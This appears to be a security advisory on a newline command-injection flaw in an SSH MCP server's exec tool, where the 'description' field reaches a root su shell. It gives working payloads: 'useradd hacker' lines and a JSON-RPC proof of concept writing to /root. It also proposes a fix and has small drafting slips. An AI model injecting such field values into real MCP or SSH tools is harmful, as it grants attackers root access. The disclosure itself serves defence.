## VULN-003 — su Shell Command Injection

## INFO

When the su shell is active, commands are written directly to an interactive shell session via `shell.write()`. The `description` parameter is appended to the command and only has `#` characters escaped. Newlines in the description allow injecting additional commands that execute as root.

**Location:** `src/index.ts:402-404` (exec tool), `src/index.ts:475-477` (sudo-exec tool), `src/index.ts:540` (shell.write)

**Vulnerable Code (exec tool):**
```typescript
const commandWithDescription = description
  ? `${sanitizedCommand} # ${description.replace(/#/g, '\\#')}`
  : sanitizedCommand;
// ...
shell.write(command + '\n');  // In execSshCommandWithConnection when su shell is active
```

**Wait — `shell.write(command + '\n')`** uses the unwrapped `command`, not `commandWithDescription`... let me verify.

Actually looking at line 540: `shell.write(command + '\n');` — the `command` parameter passed to `execSshCommandWithConnection` IS `commandWithDescription`.

**Attack Scenario:**

1. User (or LLM) calls the `exec` MCP tool with:
   ```json
   {
     "command": "ls",
     "description": "list files\nuseradd hacker\npasswd hacker"
   }
   ```

2. `sanitizeCommand("ls")` returns `"ls"` (passes validation)
3. `description.replace(/#/g, '\\#')` does NOT filter newlines
4. `commandWithDescription` = `"ls # list files\nuseradd hacker\npasswd hacker"`
5. `execSshCommandWithConnection(manager, commandWithDescription)` is called
6. Since su shell is active, the code does: `shell.write("ls # list files\nuseradd hacker\npasswd hacker\n")`
7. The interactive root shell receives:
   ```bash
   ls # list files
   useradd hacker
   passwd hacker
   ```
8. Three commands execute as root: `ls`, `useradd hacker`, `passwd hacker`

**Impact:**
- Arbitrary root command execution via description field injection
- The description field appears innocuous in MCP logs
- Only works when su shell is active (--suPassword is set)

**Fix:** Sanitize the description to remove or escape newlines and other shell metacharacters:
```typescript
const safeDescription = description.replace(/[\n\r]/g, ' ').replace(/#/g, '\\#');

## Valid

Terminal A: Initiate an `exec` call with a line-breaked `description`, so that the content of the second line is sent to the persistent root shell.

Terminal B: Check if any new files appear under `/root` and confirm that the file content corresponds to the execution result with root identity.

When `--suPassword` is enabled and a persistent root shell is established, construct the following call:


- `command`：`echo hello`
- `description`：Contains line breaks and the second command

```shell
cd /home/kali/ssh-mcp
cat <<'EOF' | node build/index.js --host=127.0.0.1 --port=2222 --user=test --password=secret --suPassword=secret
{"jsonrpc":"2.0","id":0,"method":"initialize","params":{"capabilities":{},"clientInfo":{"name":"manual","version":"1"},"protocolVersion":"0.1.0"}}
{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"exec","arguments":{"command":"echo hello","description":"benign note\nid > /root/mcp_poc_vuln005.txt"}}}
EOF
```

![image-20260324232423632](.\imgs\image-20260324232423632.png)

Check if the root file was created successfully:
```shell
ls -l /root/mcp_poc_vuln005.txt
cat /root/mcp_poc_vuln005.txt
```

![image-20260324232740831](.\imgs\image-20260324232740831.png)

- `/root/mcp_poc_vuln005.txt` was successfully created
- The file content shows that the execution identity is `uid=0(root)`

The line breaks in `description` were not filtered, causing the second line to be sent to the persistent root shell for execution.

However, `exec` itself allows the caller to pass in arbitrary shell commands, and the `description` field forms an additional command injection channel.